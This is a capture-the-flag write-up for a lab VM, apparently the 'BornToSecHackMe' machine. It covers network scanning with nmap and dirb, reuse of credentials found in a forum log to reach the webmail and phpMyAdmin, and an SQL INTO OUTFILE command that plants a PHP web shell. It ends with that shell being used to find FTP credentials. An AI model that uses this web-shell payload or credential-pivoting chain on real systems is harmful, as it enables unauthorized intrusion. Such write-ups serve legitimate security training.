# Writeup1

## 1. Finding the IP

> Please note that this section may differ depending on your network configuration.

First we get our network address
```
PS C:\Users\user> ipconfig
Carte réseau sans fil Wi-Fi :

   Suffixe DNS propre à la connexion. . . :
   Adresse IPv6. . . . . . . . . . . . . .: 2a04:cec0:10f7:c1d1:83b9:f706:901f:e740
   Adresse IPv6 temporaire . . . . . . . .: 2a04:cec0:10f7:c1d1:6919:2648:8564:bd77
   Adresse IPv6 de liaison locale. . . . .: fe80::9b0e:c803:3db7:d80c%17
   Adresse IPv4. . . . . . . . . . . . . .: 192.168.140.56
   Masque de sous-réseau. . . . . . . . . : 255.255.255.0
   Passerelle par défaut. . . . . . . . . : fe80::24a7:dbff:fec2:243%17
                                       192.168.140.206
```

In this case the network ip and mask are `192.168.140.0/24`

First we use `nmap -sn` to scan the network for all hosts
```
nmap -sn 192.168.140.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-23 17:35 CEST
Nmap scan report for 192.168.140.112
Host is up (0.0012s latency).
Nmap scan report for 192.168.140.206
Host is up (0.0066s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 43.33 seconds
```

We get two hosts, one is `192.168.140.206` which is the address present in the `ipconfig`, the other one is the VM

## 2. Look for running services

Let's scan this ip with `nmap`
```
nmap 192.168.140.112
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-29 18:18 CEST
Nmap scan report for 192.168.140.112
Host is up (0.00032s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
```

## 3. Fuzz access paths

Ports 80 and 443 are open which means a website is present on the machine, let's fuzz it with `dirb`

```
dirb https://192.168.140.112

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Wed May 29 18:20:23 2024
URL_BASE: https://192.168.140.112/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: https://192.168.140.112/ ----
+ https://192.168.140.112/cgi-bin/ (CODE:403|SIZE:291)
==> DIRECTORY: https://192.168.140.112/forum/
==> DIRECTORY: https://192.168.140.112/phpmyadmin/
+ https://192.168.140.112/server-status (CODE:403|SIZE:296)
==> DIRECTORY: https://192.168.140.112/webmail/

...
```

Let's access those links with our web browser

## 4. Forum Inspection

Here is `https://192.168.140.112/forum`

![](https://cdn.discordapp.com/attachments/1077902420316799028/1245415659970494504/image.png?ex=6658ab38&is=665759b8&hm=4437c69e262c3006d8eefc7e4e374ebabb69ff27967e637a3e9966ba31a26262&)

After close inspection the `Problem login` topic is a log file containing what looks to be login credentials

```
...
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
...
```

These credentials allows us to connect to the forum as the user `lmezard`

## 5. Logging into the forum

> login: `lmezard`

> password: `!q\]Ej?*5K5cy*AJ`

After loggin in we get access to the user's profile which gives us an email

![](https://cdn.discordapp.com/attachments/1077902420316799028/1245419184717037568/image.png?ex=6658ae80&is=66575d00&hm=43efedf37e46d8d4e5354e7b726f97dd2f186a7ffb1262281ffa2fe062617a80&)

We can try using this email and the password to access the webmail

## 6. Logging into the webmail

> login: `laurie@borntosec.net`

> password: `!q\]Ej?*5K5cy*AJ`

After loggin in we get access to two mails

![](https://cdn.discordapp.com/attachments/1077902420316799028/1245421042978127872/image.png?ex=6658b03b&is=66575ebb&hm=146d9c4a8d086d886f912e08d7407ff3c4fe19b577ba3fdaa9cc8650025a7252&)


The `DB Access` mail contains login credentials

```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```

## 7. Logging into Phpmyadmin

> login: `root`

> password: `Fg-'kKXBj87E:aJ$`

After login into Phpmyadmin we get a full `root` access to all DBs in the service

![](https://cdn.discordapp.com/attachments/1077902420316799028/1245429337885507604/image.png?ex=6658b7f5&is=66576675&hm=ad8556dd86f1f1d149a965c4b5a3911c976ba4e713965a8d8002838e090b62b3&)

Now we will try to get a `shell` to the machine by injecting a new `php` page into the forum that will execute the commands we give it

## 8.0 Injecting a webshell

We will use a SQL command to create a new file inside the forum pages directory

```SQL
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'FORUM_LOCATION/PAGE_LOCATION'
```

First we have to find the `FORUM_LOCATION` and `PAGE_LOCATION` to create the new page

Knowing the forum is using Apache, the app location is usually `/var/www`

Using `dirb` we can scan the forum for directories

```
dirb https://192.168.140.112/forum

---- Scanning URL: https://192.168.140.112/forum/ ----
+ https://192.168.140.112/forum/backup (CODE:403|SIZE:295)
+ https://192.168.140.112/forum/config (CODE:403|SIZE:295)
==> DIRECTORY: https://192.168.140.112/forum/images/
==> DIRECTORY: https://192.168.140.112/forum/includes/
+ https://192.168.140.112/forum/index (CODE:200|SIZE:4984)
+ https://192.168.140.112/forum/index.php (CODE:200|SIZE:4984)
==> DIRECTORY: https://192.168.140.112/forum/js/
==> DIRECTORY: https://192.168.140.112/forum/lang/
==> DIRECTORY: https://192.168.140.112/forum/modules/
==> DIRECTORY: https://192.168.140.112/forum/templates_c/
==> DIRECTORY: https://192.168.140.112/forum/themes/
==> DIRECTORY: https://192.168.140.112/forum/update/
```

Now we can try uploading the `shell.php` file on each directory using the command in `Phpmyadmin`

It only worked in `/forum/templaces_c` (the path is `/var/www/forum/templates_c`)

![](https://cdn.discordapp.com/attachments/1077902420316799028/1245766116358230147/image.png?ex=6659f19b&is=6658a01b&hm=64619b75648fcce9189b2e93323053c70ace1c31b6af814b309132c53f7bc55a&)

Now we can use this script as a webshell passing `cmd=COMMAND_TO_EXECUTE` as argument

![](https://cdn.discordapp.com/attachments/1077902420316799028/1245773173375369356/image.png?ex=6659f82d&is=6658a6ad&hm=3633da56275f67b5993db873478b677bc6f55c12655501dfc86d95aade5ee7dc&)

## 9. Getting a FTP access

Now that we have a shell access as user `www-data`, we will look into the machine to find usefull information

Starting in `/home/` we can see multiple users

![](https://cdn.discordapp.com/attachments/1077902420316799028/1245779549157855376/image.png?ex=6659fe1d&is=6658ac9d&hm=952aa37be837c06746e5deb5886943c3671fe882f5896444b7f0b4434a78abd9&)

We have `read` permissions only on the `/home/LOOKATME` directory

It contains a single file `password` with the following content

```
lmezard:G!@M6f4Eatau{sF"
```

This looks like credentials, we can use them to connect to the FTP 

> login: `lmezard`

> password: `G!@M6f4Eatau{sF"`

![](https://cdn.discordapp.com/attachments/1077902420316799028/1246129227523293194/image.png?ex=665b43c7&is=6659f247&hm=12cfea29d5a32693384d5e39088dd7fb141615cf9d78de54894ec423c60b325e&)

